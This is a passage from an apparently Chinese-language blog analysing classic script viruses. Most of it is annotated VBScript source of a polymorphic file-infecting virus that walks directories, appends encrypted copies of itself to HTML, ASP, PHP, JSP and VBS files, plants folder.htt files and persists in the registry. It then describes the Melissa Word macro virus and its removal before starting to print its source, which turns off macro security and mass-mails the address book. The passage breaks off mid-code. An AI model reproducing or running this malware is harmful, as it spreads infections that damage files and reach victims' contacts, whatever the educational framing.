class="line"><span class="keyword">If</span> RegTempStr = <span class="string">""</span> <span class="keyword">Then</span> </span><br><span class="line">WsShell.RegWrite RegStr,FileName </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJOboSub(CurrentString) </span></span><br><span class="line"><span class="comment">' 功能：遍历并返回目录路径 </span></span><br><span class="line"><span class="comment">' 参数： </span></span><br><span class="line"><span class="comment">' CurrentString 当前目录 </span></span><br><span class="line"><span class="keyword">Function</span> KJOboSub(CurrentString) </span><br><span class="line">SubE = <span class="number">0</span> </span><br><span class="line">TestOut = <span class="number">0</span> </span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">While</span> <span class="literal">True</span> </span><br><span class="line">TestOut = TestOut + <span class="number">1</span> </span><br><span class="line"><span class="keyword">If</span> TestOut &gt; <span class="number">28</span> <span class="keyword">Then</span> </span><br><span class="line">CurrentString = FinalyDisk &amp; <span class="string">":\"</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Do</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 取得当前目录的所有子目录，并且放到字典中 </span></span><br><span class="line"><span class="keyword">Set</span> ThisFolder = FSO.GetFolder(CurrentString) </span><br><span class="line"><span class="keyword">Set</span> DicSub = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.Dictionary"</span>) </span><br><span class="line"><span class="keyword">Set</span> Folders = ThisFolder.SubFolders </span><br><span class="line">FolderCount = <span class="number">0</span> </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> TempFolder <span class="keyword">in</span> Folders </span><br><span class="line">FolderCount = FolderCount + <span class="number">1</span> </span><br><span class="line">DicSub.add FolderCount, TempFolder.Name </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 如果没有子目录了，就调用KJChangeSub返回上一级目录或者更换盘符，并将SubE置1 </span></span><br><span class="line"><span class="keyword">If</span> DicSub.Count = <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">LastIndexChar = <span class="built_in">InstrRev</span>(CurrentString,<span class="string">"\"</span>,<span class="built_in">Len</span>(CurrentString)<span class="number">-1</span>) </span><br><span class="line">SubString = <span class="built_in">Mid</span>(CurrentString,LastIndexChar+<span class="number">1</span>,<span class="built_in">Len</span>(CurrentString)-LastIndexChar<span class="number">-1</span>) </span><br><span class="line">CurrentString = KJChangeSub(CurrentString,LastIndexChar) </span><br><span class="line">SubE = <span class="number">1</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line"><span class="comment">' 如果存在子目录 </span></span><br><span class="line"><span class="comment">' 如果SubE为0，则将CurrentString变为它的第1个子目录 </span></span><br><span class="line"><span class="keyword">If</span> SubE = <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">CurrentString = CurrentString &amp; DicSub.Item(<span class="number">1</span>) &amp; <span class="string">"\"</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Do</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line"><span class="comment">' 如果SubE为1，继续遍历子目录，并将下一个子目录返回 </span></span><br><span class="line">j = <span class="number">0</span> </span><br><span class="line"><span class="keyword">For</span> j = <span class="number">1</span> <span class="keyword">To</span> FolderCount </span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(SubString) = <span class="built_in">LCase</span>(DicSub.Item(j)) <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">If</span> j &lt; FolderCount <span class="keyword">Then</span> </span><br><span class="line">CurrentString = CurrentString &amp; DicSub.Item(j+<span class="number">1</span>) &amp; <span class="string">"\"</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Do</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line">LastIndexChar = <span class="built_in">InstrRev</span>(CurrentString,<span class="string">"\"</span>,<span class="built_in">Len</span>(CurrentString)<span class="number">-1</span>) </span><br><span class="line">SubString = <span class="built_in">Mid</span>(CurrentString,LastIndexChar+<span class="number">1</span>,<span class="built_in">Len</span>(CurrentString)-LastIndexChar<span class="number">-1</span>) </span><br><span class="line">CurrentString = KJChangeSub(CurrentString,LastIndexChar) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">Loop</span> </span><br><span class="line">KJOboSub = CurrentString </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJPropagate() </span></span><br><span class="line"><span class="comment">' 功能：病毒传播 </span></span><br><span class="line"><span class="keyword">Function</span> KJPropagate() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line">RegPathvalue = <span class="string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\Degree"</span> </span><br><span class="line">DiskDegree = WsShell.RegRead(RegPathvalue) </span><br><span class="line"><span class="comment">' 如果不存在Degree这个键值，DiskDegree则为FinalyDisk盘 </span></span><br><span class="line"><span class="keyword">If</span> DiskDegree = <span class="string">""</span> <span class="keyword">Then</span> </span><br><span class="line">DiskDegree = FinalyDisk &amp; <span class="string">":\"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 继DiskDegree置后感染5个目录 </span></span><br><span class="line"><span class="keyword">For</span> i=<span class="number">1</span> <span class="keyword">to</span> <span class="number">5</span> </span><br><span class="line">DiskDegree = KJOboSub(DiskDegree) </span><br><span class="line">KJummageFolder(DiskDegree) </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 将感染记录保存在"HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\Degree"键值中 </span></span><br><span class="line">WsShell.RegWrite RegPathvalue,DiskDegree </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJummageFolder(PathName) </span></span><br><span class="line"><span class="comment">' 功能：感染指定目录 </span></span><br><span class="line"><span class="comment">' 参数： </span></span><br><span class="line"><span class="comment">' PathName 指定目录 </span></span><br><span class="line"><span class="keyword">Function</span> KJummageFolder(PathName) </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 取得目录中的所有文件集 </span></span><br><span class="line"><span class="keyword">Set</span> FolderName = FSO.GetFolder(PathName) </span><br><span class="line"><span class="keyword">Set</span> ThisFiles = FolderName.Files </span><br><span class="line">HttExists = <span class="number">0</span> </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> ThisFile <span class="keyword">In</span> ThisFiles </span><br><span class="line">FileExt = <span class="built_in">UCase</span>(FSO.GetExtensionName(ThisFile.Path)) </span><br><span class="line"><span class="comment">' 判断扩展名 </span></span><br><span class="line"><span class="comment">' 若是HTM,HTML,ASP,PHP,JSP则向文件中追加HTML版的病毒体 </span></span><br><span class="line"><span class="comment">' 若是VBS则向文件中追加VBS版的病毒体 </span></span><br><span class="line"><span class="comment">' 若是HTT,则标志为已经存在HTT了 </span></span><br><span class="line"><span class="keyword">If</span> FileExt = <span class="string">"HTM"</span> <span class="keyword">Or</span> FileExt = <span class="string">"HTML"</span> <span class="keyword">Or</span> FileExt = <span class="string">"ASP"</span> <span class="keyword">Or</span> FileExt = <span class="string">"PHP"</span> <span class="keyword">Or</span> FileExt = <span class="string">"JSP"</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Call</span> KJAppendTo(ThisFile.Path,<span class="string">"html"</span>) </span><br><span class="line"><span class="keyword">ElseIf</span> FileExt = <span class="string">"VBS"</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Call</span> KJAppendTo(ThisFile.Path,<span class="string">"vbs"</span>) </span><br><span class="line"><span class="keyword">ElseIf</span> FileExt = <span class="string">"HTT"</span> <span class="keyword">Then</span> </span><br><span class="line">HttExists = <span class="number">1</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 如果所给的路径是桌面，则标志为已经存在HTT了 </span></span><br><span class="line"><span class="keyword">If</span> (<span class="built_in">UCase</span>(PathName) = <span class="built_in">UCase</span>(WinPath &amp; <span class="string">"Desktop\"</span>)) <span class="keyword">Or</span> (<span class="built_in">UCase</span>(PathName) = <span class="built_in">UCase</span>(WinPath &amp; <span class="string">"Desktop"</span>))<span class="keyword">Then</span> </span><br><span class="line">HttExists = <span class="number">1</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 如果不存在HTT </span></span><br><span class="line"><span class="comment">' 向目录中追加病毒体 </span></span><br><span class="line"><span class="keyword">If</span> HttExists = <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"system32\desktop.ini"</span>,PathName </span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"web\Folder.htt"</span>,PathName </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数KJSetDim() </span></span><br><span class="line"><span class="comment">' 定义FSO,WsShell对象 </span></span><br><span class="line"><span class="comment">' 取得最后一个可用磁盘卷标 </span></span><br><span class="line"><span class="comment">' 生成传染用的加密字串 </span></span><br><span class="line"><span class="comment">' 备份系统中的web\folder.htt和system32\desktop.ini </span></span><br><span class="line"><span class="keyword">Function</span> KJSetDim() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="built_in">Err</span>.Clear </span><br><span class="line"><span class="comment">' 测试当前执行文件是html还是vbs </span></span><br><span class="line">TestIt = WScript.ScriptFullname </span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Err</span> <span class="keyword">Then</span> </span><br><span class="line">InWhere = <span class="string">"html"</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line">InWhere = <span class="string">"vbs"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">' 创建文件访问对象和Shell对象 </span></span><br><span class="line"><span class="keyword">If</span> InWhere = <span class="string">"vbs"</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Set</span> FSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>) </span><br><span class="line"><span class="keyword">Set</span> WsShell = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>) </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line"><span class="keyword">Set</span> AppleObject = document.applets(<span class="string">"KJ_guest"</span>) </span><br><span class="line">AppleObject.setCLSID(<span class="string">"&#123;F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&#125;"</span>) </span><br><span class="line">AppleObject.createInstance() </span><br><span class="line"><span class="keyword">Set</span> WsShell = AppleObject.<span class="built_in">GetObject</span>() </span><br><span class="line">AppleObject.setCLSID(<span class="string">"&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;"</span>) </span><br><span class="line">AppleObject.createInstance() </span><br><span class="line"><span class="keyword">Set</span> FSO = AppleObject.<span class="built_in">GetObject</span>() </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">Set</span> DiskObject = FSO.Drives </span><br><span class="line"><span class="comment">' 判断磁盘类型 </span></span><br><span class="line"><span class="comment">' </span></span><br><span class="line"><span class="comment">' 0: Unknown </span></span><br><span class="line"><span class="comment">' 1: Removable </span></span><br><span class="line"><span class="comment">' 2: Fixed </span></span><br><span class="line"><span class="comment">' 3: Network </span></span><br><span class="line"><span class="comment">' 4: CD-ROM </span></span><br><span class="line"><span class="comment">' 5: RAM Disk </span></span><br><span class="line"><span class="comment">' 如果不是可移动磁盘或者固定磁盘就跳出循环。可能作者考虑的是网络磁盘、CD-ROM、RAM Disk都是在比较靠后的位置。呵呵，如果C:是RAMDISK会怎么样？ </span></span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> DiskTemp <span class="keyword">In</span> DiskObject </span><br><span class="line"><span class="keyword">If</span> DiskTemp.DriveType &lt;&gt; <span class="number">2</span> <span class="keyword">And</span> DiskTemp.DriveType &lt;&gt; <span class="number">1</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line">FinalyDisk = DiskTemp.DriveLetter </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">' 此前的这段病毒体已经解密，并且存放在ThisText中，现在为了传播，需要对它进行再加密。 </span></span><br><span class="line"><span class="comment">' 加密算法 </span></span><br><span class="line"><span class="keyword">Dim</span> OtherArr(<span class="number">3</span>) </span><br><span class="line"><span class="keyword">Randomize</span> </span><br><span class="line"><span class="comment">' 随机生成4个算子 </span></span><br><span class="line"><span class="keyword">For</span> i=<span class="number">0</span> <span class="keyword">To</span> <span class="number">3</span> </span><br><span class="line">OtherArr(i) = <span class="built_in">Int</span>((<span class="number">9</span> * <span class="built_in">Rnd</span>)) </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line">TempString = <span class="string">""</span> </span><br><span class="line"><span class="keyword">For</span> i=<span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(ThisText) </span><br><span class="line">TempNum = <span class="built_in">Asc</span>(<span class="built_in">Mid</span>(ThisText,i,<span class="number">1</span>)) </span><br><span class="line"><span class="comment">'对回车、换行(0x0D,0x0A)做特别的处理 </span></span><br><span class="line"><span class="keyword">If</span> TempNum = <span class="number">13</span> <span class="keyword">Then</span> </span><br><span class="line">TempNum = <span class="number">28</span> </span><br><span class="line"><span class="keyword">ElseIf</span> TempNum = <span class="number">10</span> <span class="keyword">Then</span> </span><br><span class="line">TempNum = <span class="number">29</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">'很简单的加密处理，每个字符减去相应的算子，那么在解密的时候只要按照这个顺序每个字符加上相应的算子就可以了。 </span></span><br><span class="line">TempChar = <span class="built_in">Chr</span>(TempNum - OtherArr(i Mod <span class="number">4</span>)) </span><br><span class="line"><span class="keyword">If</span> TempChar = <span class="built_in">Chr</span>(<span class="number">34</span>) <span class="keyword">Then</span> </span><br><span class="line">TempChar = <span class="built_in">Chr</span>(<span class="number">18</span>) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line">TempString = TempString &amp; TempChar </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 含有解密算法的字串 </span></span><br><span class="line">UnLockStr = <span class="string">"Execute(""Dim KeyArr(3),ThisText""&amp;vbCrLf&amp;""KeyArr(0) = "</span> &amp; OtherArr(<span class="number">0</span>) &amp; <span class="string">"""&amp;vbCrLf&amp;""KeyArr(1) = "</span> &amp; OtherArr(<span class="number">1</span>) &amp; <span class="string">"""&amp;vbCrLf&amp;""KeyArr(2) = "</span> &amp; OtherArr(<span class="number">2</span>) &amp; <span class="string">"""&amp;vbCrLf&amp;""KeyArr(3) = "</span> &amp; OtherArr(<span class="number">3</span>) &amp; <span class="string">"""&amp;vbCrLf&amp;""For i=1 To Len(ExeString)""&amp;vbCrLf&amp;""TempNum = Asc(Mid(ExeString,i,1))""&amp;vbCrLf&amp;""If TempNum = 18 Then""&amp;vbCrLf&amp;""TempNum = 34""&amp;vbCrLf&amp;""End If""&amp;vbCrLf&amp;""TempChar = Chr(TempNum + KeyArr(i Mod 4))""&amp;vbCrLf&amp;""If TempChar = Chr(28) Then""&amp;vbCrLf&amp;""TempChar = vbCr""&amp;vbCrLf&amp;""ElseIf TempChar = Chr(29) Then""&amp;vbCrLf&amp;""TempChar = vbLf""&amp;vbCrLf&amp;""End If""&amp;vbCrLf&amp;""ThisText = ThisText &amp; TempChar""&amp;vbCrLf&amp;""Next"")"</span> &amp; vbCrLf &amp; <span class="string">"Execute(ThisText)"</span> </span><br><span class="line"><span class="comment">' 将加密好的病毒体复制给变量 ThisText </span></span><br><span class="line">ThisText = <span class="string">"ExeString = """</span> &amp; TempString &amp; <span class="string">""""</span> </span><br><span class="line"><span class="comment">' 生成html感染用的脚本 </span></span><br><span class="line">HtmlText =<span class="string">"&lt;"</span> &amp; <span class="string">"script language=vbscript&gt;"</span> &amp; vbCrLf &amp; <span class="string">"document.write "</span> &amp; <span class="string">""""</span> &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'&gt;"</span> &amp; <span class="string">"&lt;""&amp;"""</span> &amp; <span class="string">"APPLET NAME=KJ""&amp;""_guest HEIGHT=0 WIDTH=0 code=com.ms.""&amp;""activeX.Active""&amp;""XComponent&gt;"</span> &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/APPLET&gt;"</span> &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/div&gt;"""</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/script&gt;"</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"script language=vbscript&gt;"</span> &amp; vbCrLf &amp; ThisText &amp; vbCrLf &amp; UnLockStr &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/script&gt;"</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/BODY&gt;"</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"/HTML&gt;"</span> </span><br><span class="line"><span class="comment">' 生成vbs感染用的脚本 </span></span><br><span class="line">VbsText = ThisText &amp; vbCrLf &amp; UnLockStr &amp; vbCrLf &amp; <span class="string">"KJ_start()"</span> </span><br><span class="line"><span class="comment">' 取得Windows目录 </span></span><br><span class="line"><span class="comment">' GetSpecialFolder(n) </span></span><br><span class="line"><span class="comment">' 0: WindowsFolder </span></span><br><span class="line"><span class="comment">' 1: SystemFolder </span></span><br><span class="line"><span class="comment">' 2: TemporaryFolder </span></span><br><span class="line"><span class="comment">' 如果系统目录存在web\Folder.htt和system32\desktop.ini，则用kjwall.gif文件名备份它们。 </span></span><br><span class="line">WinPath = FSO.GetSpecialFolder(<span class="number">0</span>) &amp; <span class="string">"\"</span> </span><br><span class="line"><span class="keyword">If</span> (FSO.FileExists(WinPath &amp; <span class="string">"web\Folder.htt"</span>)) <span class="keyword">Then</span> </span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"web\Folder.htt"</span>,WinPath &amp; <span class="string">"web\kjwall.gif"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">If</span> (FSO.FileExists(WinPath &amp; <span class="string">"system32\desktop.ini"</span>)) <span class="keyword">Then</span> </span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"system32\desktop.ini"</span>,WinPath &amp; <span class="string">"system32\kjwall.gif"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure><p>这个病毒是用VBS编写的多变形、加密病毒，感染扩展名为<code>.html</code>, <code>.htm</code>, <code>.asp</code>, <code>.php</code>, <code>.jsp</code>,<code>.htt</code>和<code>.vbs</code>文件，同时该病毒会大量生成<code>folder.htt</code>和<code>desktop.ini</code>，并在<code>%windir%\System\</code>中生成一个名字叫<code>Kernel.dll</code>的文件（Windows 9x/Me）或<code>Kernel32.dll</code>（Windows NT/2000），修改.dll文件的打开方式，感染<code>Outlook</code>的信纸文件。<br>（注：<code>%windir%</code>指的是Windows的目录， 对于Win9x/Me系统来说，这个目录通常是\Windows，对于Windows NT/2000来说，这个目录通常是\WinNT；特别注意：这两个Kernel文件生成的路径都是%windir%\System\，而不是%windir%\System32\）<br>感染这个病毒后有两个明显的表现：</p><ul><li><p>在每个目录中都会生成<code>folder.htt</code>（带毒文件）和<code>desktop.ini</code>（目录配置文件）；</p></li><li><p>电脑运行速度明显变慢，在任务列表中可以看到有大量的<code>Wscript.exe</code>程序在运行。</p></li></ul><h3 id="梅利莎病毒"><a href="#梅利莎病毒" class="headerlink" title="梅利莎病毒"></a>梅利莎病毒</h3><blockquote><p><a href="https://baike.baidu.com/item/%E6%A2%85%E4%B8%BD%E8%8E%8E%E7%97%85%E6%AF%92" target="_blank" rel="noopener">梅丽莎病毒-百度百科</a></p><p><a href="https://zh.wikipedia.org/wiki/%E6%A2%85%E4%B8%BD%E8%8E%8E%E7%97%85%E6%AF%92" target="_blank" rel="noopener">梅丽莎病毒-wiki</a></p><p><a href="http://halfnet.tripod.com/virus.htm" target="_blank" rel="noopener">Melissa分析</a></p><p><a href="https://www.yumpu.com/en/document/read/17258254/dr-xiao-dong-zhu-3-" target="_blank" rel="noopener">Melissa病毒分析-ppt</a></p><p><a href="https://packetstormsecurity.com/files/download/12131/melissa.macro.virus.txt" target="_blank" rel="noopener">melissa.macro.virus.txt</a></p></blockquote><p>梅丽莎病毒属于word宏病毒，主要通过电脑邮件传播，主要利用了人类的好奇心——这是给你的资料，不要让任何人看见，更有意思的是，这个病毒的名字来源于作者在佛罗里达州遇到过的一个脱衣女郎的名字XD</p><p>梅丽莎病毒一般通过邮件传播，邮件的标题通常为“这是给你的资料，不要让任何人看见”。一旦收件人打开病毒邮件，病毒就会自动向用户通讯录的前50位好友复制发送同样的邮件。</p><blockquote><p>手工清除办法：</p><ul><li>删除所有的<code>normal.dot</code>文件，注意隐藏文件和系统文件中的搜索</li><li>打开注册表管理器，搜索所有名称为<code>Melissa</code>的项，全部删除</li><li>删除所有染毒的word</li></ul></blockquote><p>Word宏，本质上是一个批量处理程序命令，微软用其提高工作效率</p><p>宏其实就是一段vbscript代码，当word运行时自动运行宏代码，经过实验，word宏在删除带有宏的word文件之后或者禁用宏功能之后，仍然可以在新建word时自动运行宏，更别说是一个病毒宏的传播了，其自动运行，难以删除的特性，使得Melissa病毒有着重大影响力</p><blockquote><p>现在的word可以在：<code>审阅 ➡ 宏</code>中创建新的宏</p><p>在<code>文件 ➡ 信任中心 ➡ 信任中心设置 ➡ 宏设置</code>中可以打开是否启用宏</p></blockquote><p>病毒源码如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">'Part1</span></span><br><span class="line"><span class="comment">'</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Document_Open()</span><br><span class="line">  <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="comment">'读取Windows Registry，即注册表</span></span><br><span class="line">    <span class="comment">'如果是word2000就把Security设置为最低</span></span><br><span class="line">    <span class="comment">'若不是则把word的转化确认、病毒保护、模板存储确认设置成off</span></span><br><span class="line">    <span class="comment">'然后把菜单项Tools-&gt;Macro Disable ,这样达到隐藏代码的效果</span></span><br><span class="line">  <span class="keyword">If</span> System.PrivateProfileString(<span class="string">""</span>,</span><br><span class="line">       <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span>,</span><br><span class="line">       <span class="string">"Level"</span>) &lt;&gt; <span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">    CommandBars(<span class="string">"Macro"</span>).Controls(<span class="string">"Security..."</span>).Enabled = <span class="literal">False</span></span><br><span class="line">    System.PrivateProfileString(<span class="string">""</span>,</span><br><span class="line">       <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span>,</span><br><span class="line">       <span class="string">"Level"</span>) = <span class="number">1</span>&amp;</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">    CommandBars(<span class="string">"Tools"</span>).Controls(<span class="string">"Macro"</span>).Enabled = <span class="literal">False</span></span><br><span class="line">    Options.ConfirmConversions = (<span class="number">1</span> - <span class="number">1</span>): Options.VirusProtection = (<span class="number">1</span> - <span class="number">1</span>):</span><br><span class="line">    Options.SaveNormalPrompt = (<span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">'Part2</span></span><br><span class="line">    <span class="comment">'Melissa病毒Payload主体</span></span><br><span class="line">    <span class="comment">'先判断是否已经感染</span></span><br><span class="line">    <span class="comment">'感染的标记在注册表里</span></span><br><span class="line">    <span class="comment">'若无感染则写一个主题为Important Message From $name Here is that document you asked for ... don't show anyone else ;-)的邮件，以及附有病毒word(即本文件)发送到地址簿上的前50个人</span></span><br><span class="line">    <span class="comment">'然后再注册表中标记已感染</span></span><br><span class="line"><span class="keyword">Dim</span> UngaDasOutlook, DasMapiName, BreakUmOffASlice</span><br><span class="line"><span class="keyword">Set</span> UngaDasOutlook = <span class="built_in">CreateObject</span>(<span class="string">"Outlook.Application"</span>)</span><br><span class="line"><span class="keyword">Set</span> DasMapiName = UngaDasOutlook.GetNameSpace(<span class="string">"MAPI"</span>)</span><br><span class="line"><span class="keyword">If</span> System.PrivateProfileString(<span class="string">""</span>,</span><br><span class="line">    <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span>, <span class="string">"Melissa?"</span>) &lt;&gt;</span><br><span class="line">    <span class="string">"... by Kwyjibo"</span> <span class="keyword">Then</span></span><br><span class="line">  <span class="keyword">If</span> UngaDasOutlook = <span class="string">"Inlook"</span> <span class="keyword">Then</span></span><br><span class="line">    DasMapName.Logon <span class="string">"profile"</span>, <span class="string">"password"</span></span><br><span class="line">    <span class="keyword">For</span> y = <span class="number">1</span> <span class="keyword">To</span> DasMapName.AddressLists.Count</span><br><span class="line">        <span class="keyword">Set</span> AddyBook = DasMapiName.AddressLists(y)</span><br><span class="line">        <span class="keyword">Set</span> BreakOffASlice = UngaDasOutlook.CreateItem(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">For</span> oo = <span class="number">1</span> <span class="keyword">To</span> 